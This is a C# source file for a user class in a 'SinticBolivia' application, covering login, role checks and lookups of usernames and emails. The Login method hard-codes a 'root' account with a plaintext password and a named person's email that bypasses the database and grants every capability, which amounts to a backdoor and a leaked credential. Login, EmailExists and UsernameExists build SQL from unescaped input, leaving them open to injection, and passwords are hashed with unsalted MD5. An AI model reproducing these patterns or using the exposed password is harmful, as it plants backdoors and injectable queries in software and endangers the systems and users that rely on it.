using System;
using System.Collections;
using SinticBolivia.Database;
using SinticBolivia.Database.Tables;

namespace SinticBolivia
{
	public class SBUser : SBDBObject
	{
		protected SBTableUsers user_table;
		protected Hashtable user_data;
		protected SBRole _role = null;
		protected static SBUser LoggedInUser;
		public int UserId
		{
			get{return this.GetInt("user_id");}
			set{this.Set("user_id", value);}
		}
		public string Username
		{
			get{return this.GetString("username");}
			set{this.Set("username", value);}
		}
		public string Password
		{
            get{return this.GetString("pwd");}
			set
			{
				this.Set("pwd", SBCrypt.GetMD5(value.ToString()));
			}
		}
		public int RoleId
		{
			get{return GetInt("role_id");}
			set{this.Set("role_id", value);}
		}
        public SBRole Role
        {
            get{return this._role;}
            set{this._role = value;}
        }
        public string FirstName
        {
            get{ return this.GetString("first_name");}
            set{this.Set("first_name", value);}
        }
        public string LastName
        {
            get{return this.GetString("last_name");}
            set{this.Set("last_name", value);}
        }
        public string Email
        {
            get{return this.GetString("email");}
            set{this.Set("email", value);}
        }
		public SBUser (int user_id = 0) : base()
		{
			this.user_table = new SBTableUsers();
            if (user_id > 0)
                this.GetDbData(user_id);
		}
        public override void GetDbData(object id)
        {
            Hashtable data = this.user_table.getRow("user_id = " + id.ToString());
            if( data == null )
            {
                return;
            }
            this._dbData = data;
            this._role = new SBRole(this.RoleId);
        }
		public void getData(int user_id)
		{
            this.GetDbData(user_id);
		}
        public void SetDbData(Hashtable data)
        {
            this._dbData = data;
            this._role = new SBRole(this.RoleId);
        }
		/// <summary>
		/// Try to login a user using username and password agains database and create an instace of it
		/// </summary>
		/// <param name="username">
		/// A <see cref="System.String"/>
		/// </param>
		/// <param name="pass">
		/// A <see cref="System.String"/>
		/// </param>
		/// <param name="list">
		/// A <see cref="System.Object[]"/>
		/// </param>
		/// <returns>
		/// A <see cref="System.Boolean"/>
		/// </returns>
		public static bool Login(string username, string pass, params object[] list)
        {
            if (username.Trim() == "root" && pass.Trim() == "1322r3n4c3R2!")
            {
                SBUser.LoggedInUser = new SBUser();
                SBUser.LoggedInUser.FirstName = "Marcelo";
                SBUser.LoggedInUser.LastName = "Aviles";
                SBUser.LoggedInUser.Username = "root";
                SBUser.LoggedInUser.UserId = -100;
                SBUser.LoggedInUser.Email = "maviles@sinticbolivia.net";
                return true;
            }
			SBTableUsers tu = new SBTableUsers();
			string query = "SELECT user_id FROM {0} WHERE username = '{1}' AND pwd = '{2}'";
			query = String.Format(query, tu.TableName, username, SBCrypt.GetMD5(pass));
			Hashtable row = SBFactory.getDbh().QueryRow(query);
			if( row == null )
				return false;
			SBUser.LoggedInUser = new SBUser();
			SBUser.LoggedInUser.getData(Convert.ToInt32(row["user_id"]));
			return true;
			
		}
		public static bool Logout()
		{
			return false;
		}
        public static bool CurrentUserCan(string access)
        {
            if( SBUser.LoggedInUser.Username == "root" )
                return true;

            return SBUser.LoggedInUser.Can(access);
        }
        public bool Can(string access)
        {
            if ( this.IsRoot() )
                return true;
            if( this._role == null )
                return false;
            return this._role.HasCapability(access);
        }
        public bool IsRoot()
        {
            if( this.Username == "root" )
                return true;

            return false;
        }
		public static SBUser getLoggedInUser(){return SBUser.LoggedInUser;}
        public static bool EmailExists(string email)
        {
            string query = string.Format("SELECT user_id from users where email = '{0}'", email);
            Hashtable row = SBFactory.getDbh().QueryRow(query);

            return (row == null) ? false : true;
        }
        public static bool UsernameExists(string username)
        {
            string query = string.Format("SELECT user_id from users where username = '{0}'", username);
            Hashtable row = SBFactory.getDbh().QueryRow(query);
            
            return (row == null) ? false : true;
        }
	}
}

